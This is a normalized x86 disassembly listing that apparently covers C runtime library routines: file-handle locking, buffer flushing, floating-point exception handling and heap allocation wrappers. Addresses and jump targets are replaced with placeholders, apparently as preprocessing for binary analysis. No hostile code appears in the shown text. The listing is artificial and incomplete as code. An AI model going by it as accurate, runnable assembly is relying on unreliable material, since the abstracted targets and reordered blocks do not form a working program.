jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_1000da39
push 0xc
push r--data
call sub_10009700
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_1000bf98
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_10009745
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000dacf
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_1000dad8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000daff
push 0x18
push r--data
call sub_10009700
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_1000bed6
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_1000bf98
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000dc8f
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_10009745
retn
push 0x40
push 0x20
call sub_1000aaed
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_1000da39
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_1000bf98
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1000dbd1
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_1000dc98
push 0x10
push r--data
call sub_10009700
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10007892
mov [ eax ] 0x9
call sub_10007892
mov [ eax ] 0x9
call sub_10007840
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10009745
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1000da39
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_10007892
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1000d9d0
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000dd69
mov eax [ ebp - 0x1c ]
call sub_100078a5
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_1000dded
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_1000e637
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_1000e647
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_1000e0c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_1000e683
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_1000e683
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_1000e683
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_1000e683
pop ecx
and esi 0xffffffef
push edi
mov edi [ ebp + 0xc ]
fld [ edi ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1000e574
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_1000e683
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_1000e2ad
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_10007892
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_10007892
mov [ eax ] 0x22
pop ebp
retn
sub_1000e2da
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_1000e30e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_1000e658
push [ ebp + 0x8 ]
call sub_1000e2ad
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_1000e658
lea eax [ ebp - 0x20 ]
push eax
call sub_1000dd71
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_1000e2ad
pop ecx
sub_1000e3ae
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
call sub_10007892
push 0xffff
push [ ebp + 0x14 ]
mov [ eax ] 0x21
call sub_1000e658
fld [ ebp + 0xc ]
pop ecx
pop ecx
pop ebp
retn
push [ ebp + 0x14 ]
fld [ ebp + 0xc ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_1000e30e
add esp 0x24
pop ebp
retn
sub_1000e403
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x20 ]
lea eax [ ebx + 0x18 ]
push eax
push [ ebx + 0x8 ]
call sub_1000e0c9
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_1000e2da
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebp - 0x40 ] 0xfffffffe
push eax
lea eax [ ebx + 0x18 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_1000dded
add esp 0x1c
push eax
call sub_1000e2ad
mov [ esp ] 0xffff
push [ ebx + 0x20 ]
call sub_1000e658
fld [ ebx + 0x18 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x20 ]
fld [ ebx + 0x18 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_1000e30e
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008edb
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_1000e4e1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_1000e50e
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov cx [ ebp + 0xe ]
mov eax 0x7ff8
push esi
mov esi eax
and cx si
pop esi
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_1000e574
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
movzx eax [ ebp + 0xe ]
xor ecx ecx
test eax 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_1000e4e1
movzx edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_1000e4e1
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_1000e658
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1000e683
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_1000e6db
push 0x8
push r--data
call sub_10009700
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_10009745
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_1000e74d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_10007892
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_10007bbc
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_1000e7cf
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10007b19
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100079a5
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_10007bbc
pop ecx
call sub_10007892
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_10007892
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10007850
pop ecx
mov [ esi ] eax
push esi
call sub_10007bbc
pop ecx
test eax eax
je r-xdata
call sub_10007892
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10007850
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_1000e8e4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_1000e928
push 0x20
push r--data
call sub_10009700
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100088e6
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_10009745
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1000e8e4
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1000ae0a
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1000bf98
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_100087af
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000ea8f
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_1000eae9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
